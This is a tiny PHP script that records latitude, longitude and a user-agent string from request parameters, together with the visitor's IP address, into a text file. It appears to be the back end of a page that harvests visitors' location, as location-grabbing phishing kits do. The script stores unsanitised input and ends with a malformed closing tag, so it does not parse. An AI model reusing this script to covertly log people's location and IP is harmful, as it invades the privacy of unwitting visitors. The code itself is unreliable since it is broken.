<?php

$myfile = fopen("location.txt", "w");
$txt = "lat: " . $_GET["lat"] . "\nlong: " . $_GET["long"] . "\nIP Address: " . $_SERVER["REMOTE_ADDR"] . "\nUser Os: " . $_GET["uagent"];
fwrite($myfile, $txt);
fclose($myfile);
>